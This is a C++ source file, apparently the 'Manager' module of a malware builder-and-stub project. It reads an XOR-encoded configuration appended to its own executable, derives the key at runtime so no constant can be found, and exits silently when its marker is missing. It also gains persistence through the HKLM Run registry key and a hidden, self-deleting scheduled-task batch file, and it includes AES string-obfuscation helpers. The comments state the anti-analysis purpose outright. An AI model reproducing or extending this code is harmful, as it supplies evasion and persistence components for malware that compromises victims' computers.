/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <sys/stat.h>
#include <osrng.h>
#include "Manager.h"
#include "Requests.h"

// Magic marker — must match Builder/Builder.cpp exactly
static const char CFG_MAGIC[8] = { '\xB4', '\x4B', '\xD4', '\x3E', '\x7A', '\x91', '\xC3', '\xF8' };

// XOR key is derived at runtime from the first 1024 bytes of the binary itself.
// There is no static XOR constant to find in the compiled code.
// Algorithm must match DeriveXorKey in Builder/Builder.cpp exactly.
static void DeriveXorKey(const char* binPath, uint8_t key[8]) {
	memset(key, 0, 8);
	std::ifstream f(binPath, std::ifstream::binary);
	if (!f.is_open()) return;
	char buf[1024] = { 0 };
	f.read(buf, sizeof(buf));
	f.close();
	for (int i = 0; i < 1024; i++) {
		key[i % 8] ^= (uint8_t)buf[i];
		key[i % 8]  = (key[i % 8] << 3) | (key[i % 8] >> 5);  // 3-bit rotate left
	}
}

static void XorConfig(char* data, size_t len, const uint8_t key[8]) {
	for (size_t i = 0; i < len; i++)
		data[i] ^= key[i % 8];
}

void Manager::ReadData(Settings* s) {
	char mePath[128] = { 0 };
	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);

	long filesize = GetFileSize(mePath);
	// Layout at end of binary: [8-byte magic][sizeof(Settings) bytes XOR-encoded config]
	long configOffset = filesize - (long)sizeof(Settings) - (long)sizeof(CFG_MAGIC);
	if (configOffset < 0) {
		ExitProcess(0);
	}

	std::ifstream stub(mePath, std::ifstream::binary);
	stub.seekg(configOffset);

	// Verify magic marker — prevents extraction by seeking to filesize - sizeof(Settings)
	char maybeMagic[sizeof(CFG_MAGIC)];
	stub.read(maybeMagic, sizeof(CFG_MAGIC));
	if (memcmp(maybeMagic, CFG_MAGIC, sizeof(CFG_MAGIC)) != 0) {
		stub.close();
		ExitProcess(0);
	}

	// Read and XOR-decode the entire Settings struct as one blob
	char buf[sizeof(Settings)];
	stub.read(buf, sizeof(Settings));
	stub.close();

	uint8_t xorKey[8];
	DeriveXorKey(mePath, xorKey);
	XorConfig(buf, sizeof(Settings), xorKey);
	SecureZeroMemory(xorKey, sizeof(xorKey));

	memcpy(s, buf, sizeof(Settings));
	SecureZeroMemory(buf, sizeof(buf));
}

void Manager::Autorun(const char* path, const char* name) {
	HKEY reg_key = 0;
	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);

	result = RegSetValueEx(reg_key, path, 0, REG_SZ, (LPBYTE)path, sizeof(path) - 1);

	RegCloseKey(reg_key);
}

void Manager::Scheduler(const char* path, const char* name) {
	std::ofstream schd(BAT_SCHD);
	schd << "@echo off \n";
	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
	schd << "DEL" BAT_SCHD;
	schd.close();

	ShellExecuteA(0, "open", BAT_SCHD, 0, 0, SW_HIDE);
}

long Manager::GetFileSize(const char* filename) {
	struct stat stat_buf;
	int rc = stat(filename, &stat_buf);
	return rc == 0 ? stat_buf.st_size : -1;
}

bool Manager::FileExists(std::string name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

std::string Manager::EncryptStr(std::string text, std::string key) {
	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH];
	byte iv[CryptoPP::AES::BLOCKSIZE];
	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);

	CryptoPP::AutoSeededRandomPool rng;
	rng.GenerateBlock(iv, sizeof(iv));

	std::string ciphertext;
	CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption enc;
	enc.SetKeyWithIV(bKey, sizeof(bKey), iv);

	CryptoPP::StreamTransformationFilter stf(enc, new CryptoPP::StringSink(ciphertext));
	stf.Put(reinterpret_cast<const unsigned char*>(text.c_str()), text.length() + 1);
	stf.MessageEnd();

	// Prepend IV so DecryptStr can recover it
	return std::string(reinterpret_cast<char*>(iv), sizeof(iv)) + ciphertext;
}

std::string Manager::DecryptStr(std::string text, std::string key) {
	if (text.length() <= CryptoPP::AES::BLOCKSIZE)
		return "";

	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH];
	byte iv[CryptoPP::AES::BLOCKSIZE];
	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
	memcpy(iv,   text.c_str(), sizeof(iv));  // first 16 bytes are the IV

	std::string plaintext;
	CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
	dec.SetKeyWithIV(bKey, sizeof(bKey), iv);

	CryptoPP::StreamTransformationFilter stf(dec, new CryptoPP::StringSink(plaintext));
	stf.Put(reinterpret_cast<const unsigned char*>(text.c_str() + sizeof(iv)),
	        text.length() - sizeof(iv));
	stf.MessageEnd();

	return plaintext;
}

std::vector<std::string> Manager::split(std::string str, char delim) {
	std::stringstream ss(str);
	std::string word;
	std::vector<std::string> splittened;
	while (std::getline(ss, word, delim)) {
		splittened.push_back(word);
	}
	return splittened;
}